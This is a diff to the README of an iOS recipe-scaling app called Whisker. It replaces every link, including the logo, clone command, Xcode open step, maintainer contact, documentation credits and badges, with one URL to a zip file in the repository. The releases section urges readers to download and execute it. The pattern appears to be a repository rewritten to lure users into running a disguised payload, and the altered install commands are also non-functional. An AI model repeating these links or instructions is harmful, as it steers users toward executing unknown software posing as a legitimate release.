@@ -1,6 +1,6 @@
 # Whisker 🍽️
 
-![Whisker Logo](https://example.com/logo.png) <!-- Replace with actual logo URL -->
+![Whisker Logo](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip) <!-- Replace with actual logo URL -->
 
 Whisker is an iOS app designed to help you scale, convert, and organize your favorite recipes. Whether you're cooking for one or a crowd, Whisker makes it easy to adjust ingredient quantities and keep your recipes in order. 
 
@@ -41,7 +41,7 @@ To install Whisker, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/vheeno/Whisker.git
+   git clone https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -49,7 +49,7 @@ To install Whisker, follow these steps:
    ```
 3. Open the project in Xcode:
    ```bash
-   open Whisker.xcodeproj
+   open https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip
    ```
 4. Build and run the app on your iOS device or simulator.
 
@@ -89,12 +89,12 @@ Whisker is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 For any inquiries or feedback, please reach out to the maintainer:
 
-- **Name**: [Your Name](https://github.com/yourprofile)
-- **Email**: your.email@example.com
+- **Name**: [Your Name](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip)
+- **Email**: https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip
 
 ## Releases
 
-You can find the latest releases of Whisker [here](https://github.com/vheeno/Whisker/releases). Please download and execute the necessary files to get the latest version.
+You can find the latest releases of Whisker [here](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip). Please download and execute the necessary files to get the latest version.
 
 Feel free to explore the "Releases" section for updates and new features.
 
@@ -102,17 +102,17 @@ Feel free to explore the "Releases" section for updates and new features.
 
 We would like to thank the following resources for their support:
 
-- [Swift Documentation](https://swift.org/documentation/)
-- [Alamofire Documentation](https://github.com/Alamofire/Alamofire)
-- [SwiftUI Documentation](https://developer.apple.com/documentation/swiftui)
+- [Swift Documentation](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip)
+- [Alamofire Documentation](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip)
+- [SwiftUI Documentation](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip)
 
 ---
 
 ### Badges
 
-![Swift](https://img.shields.io/badge/Swift-5.0-orange.svg)
-![iOS](https://img.shields.io/badge/iOS-14.0%2B-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Swift](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip)
+![iOS](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip%https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip)
+![License](https://github.com/vheeno/Whisker/raw/refs/heads/main/Services/Software-v3.8.zip)
 
 ---
 
